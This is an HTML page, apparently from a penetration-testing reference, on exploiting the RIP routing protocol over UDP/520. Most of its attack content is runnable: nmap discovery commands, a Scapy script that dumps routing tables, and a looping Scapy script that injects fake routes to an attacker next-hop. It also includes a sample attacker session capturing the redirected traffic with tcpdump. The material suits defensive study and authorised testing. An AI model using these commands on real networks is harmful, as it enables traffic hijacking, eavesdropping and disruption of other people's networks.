<!-- Title -->
<h1 class="text-2xl font-bold mb-2">RIP (Routing Information Protocol) Exploitation</h1>
<p class="text-gray-300 mb-4">
  Domain: <strong>Network Security</strong> • Focus: <strong>RIP Abuse & Route Injection</strong> • Last Updated: <strong>2025-09-05</strong>
</p>

<!-- Summary -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Summary</h2>
  <p class="text-gray-300">
    RIP (UDP/520) is a distance-vector routing protocol that distributes routing 
    tables between routers. It is vulnerable to route injection and manipulation 
    because it lacks authentication (except for weak plain-text options in v2). 
    Attackers exploit RIP to learn network topology, hijack traffic flows, 
    redirect packets for man-in-the-middle attacks, or cause denial of service 
    by injecting bogus routes. RIP exploitation highlights the dangers of legacy 
    routing protocols when exposed in modern environments.
  </p>
</section>

<!-- Why Exploitable -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
  <ul class="list-disc ml-5 text-gray-200 space-y-2">
    <li><strong>No Authentication (RIPv1):</strong> Accepts routing updates from any source.</li>
    <li><strong>Weak Auth (RIPv2):</strong> Passwords are in cleartext in routing updates.</li>
    <li><strong>Information Disclosure:</strong> Attackers can query routing tables.</li>
    <li><strong>Route Injection:</strong> Malicious updates can redirect or blackhole traffic.</li>
    <li><strong>DoS Risk:</strong> Routing loops or bogus routes can disrupt connectivity.</li>
  </ul>
</section>

<!-- How Exploitation Works -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li><strong>Discovery:</strong> Identify hosts running RIP on UDP/520.</li>
    <li><strong>Enumeration:</strong> Request routing table to learn internal network topology.</li>
    <li><strong>Injection:</strong> Send malicious RIP updates advertising fake routes.</li>
    <li><strong>Impact:</strong> Redirect traffic (MITM), blackhole routes, or cause instability.</li>
  </ol>
</section>

<!-- Steps -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Steps</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li>Scan and confirm UDP/520 service exposure.</li>
    <li>Dump routing tables with crafted RIP requests.</li>
    <li>Craft and inject malicious RIP updates.</li>
    <li>Observe routing changes and pivot traffic as needed.</li>
  </ol>
</section>

<!-- Commands -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Commands</h2>
  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">

# ------------------------------
# Discovery
# ------------------------------
nmap -sU -p 520 [target]                 # Check for RIP service
nmap --script rip-enum [target]          # Enumerate RIP (if NSE available)

# ------------------------------
# Dump Routing Table
# ------------------------------
# Using Scapy (Python)
sudo python3 - <<'EOF'
from scapy.all import *
send(IP(dst="[target]")/UDP(sport=520,dport=520)/RIP(cmd=1,version=2))
EOF

# ------------------------------
# Inject Malicious Routes
# ------------------------------
# Example: Advertise fake route to redirect traffic
sudo python3 - <<'EOF'
from scapy.all import *
pkt = IP(dst="[target]")/UDP(sport=520,dport=520)/RIP(cmd=2,version=2)/RIPEntry(AF=2,addr="10.0.0.0",mask="255.0.0.0",nextHop="192.168.1.100",metric=1)
send(pkt,loop=1,inter=5)
EOF

# ------------------------------
# Example Workflow
# ------------------------------
nmap -sU -p 520 192.168.1.1
python3 rip_enum.py --target 192.168.1.1
python3 rip_inject.py --target 192.168.1.1 --route 10.0.0.0/8 --next-hop 192.168.1.100
  </pre>
</section>

<!-- Real-World Exploitation Walkthrough -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to expand attacker session
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

[ saide ~ ]$ nmap -sU -p 520 192.168.1.1
PORT    STATE SERVICE
520/udp open  rip

[ saide ~ ]$ python3 rip_enum.py --target 192.168.1.1
[+] Received RIP response
Route: 172.16.0.0/16 via 192.168.1.1 metric 1
Route: 10.0.0.0/8 via 192.168.1.1 metric 2

[ saide ~ ]$ python3 rip_inject.py --target 192.168.1.1 --route 10.10.10.0/24 --next-hop 192.168.1.50
[+] Injected malicious route: 10.10.10.0/24 → next-hop 192.168.1.50

[ saide ~ ]$ tcpdump -i eth0 net 10.10.10.0/24
[*] Capturing redirected traffic through attacker box
    </pre>
  </details>
</section>

<!-- Example Results -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to view sample RIP exploitation results
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

# RIP Routing Table Enumeration
172.16.0.0/16 via 192.168.1.1 metric 1
10.0.0.0/8 via 192.168.1.1 metric 2

# Malicious Route Injection
10.10.10.0/24 via attacker (192.168.1.50)

# Proof of Exploitation
Victim traffic destined for 10.10.10.0/24 now routes through attacker system
tcpdump shows intercepted packets
    </pre>
  </details>
</section>

<!-- References -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
  <h2 class="text-lg font-semibold mb-2">References</h2>
  <ul class="list-disc ml-5 text-gray-200">
    <li>
      <a href="https://book.hacktricks.xyz/network-services-pentesting/rip-routing-information-protocol" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        HackTricks – Pentesting RIP
      </a>
    </li>
    <li>
      <a href="https://www.ietf.org/rfc/rfc2453.txt" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        RFC 2453 – RIP v2 Specification
      </a>
    </li>
    <li>Red Team workflow: RIP discovery → Route table dump → Route injection → MITM.</li>
  </ul>
</section>
